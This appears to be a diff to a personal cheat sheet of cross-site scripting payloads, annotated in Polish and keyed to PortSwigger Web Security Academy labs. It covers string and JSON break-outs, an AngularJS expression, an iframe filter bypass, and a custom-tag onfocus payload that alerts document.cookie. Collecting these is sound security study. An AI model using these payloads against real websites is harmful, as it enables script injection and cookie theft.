@@ -9,15 +9,33 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 javascript:alert('You are hacked!')
 <><img src=1 onerror=alert(1)>
 
+***********************************************************************************************************************************************************
 [Wstrzykciecie w srodku zmiennej]
 '-alert(1)-'                          (https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)
 
+***********************************************************************************************************************************************************
 [Podatnosc w angularze jezeli element jest objety app-ng no mozna wyonac kod]
 {{$on.constructor('alert(1)')()}}     (https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
 
+
+***********************************************************************************************************************************************************
 [Na format jason wyskakuje z skryptu javascript (opisane na stornie)]
 \"-alert(1)}//                        (https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)
 
+
+***********************************************************************************************************************************************************
 [Podatny parametr w pasku url (odkryty przez fazowanie (znacznikow html) i (dozwolonych metod))]
 Website: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
 Payload: <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+
+
+***********************************************************************************************************************************************************
+[Stworzenie swojego tagu]
+-> <xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
+(to encode url) -> %3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+
+Payload:
+<script> location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>
+
+Link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
+***********************************************************************************************************************************************************
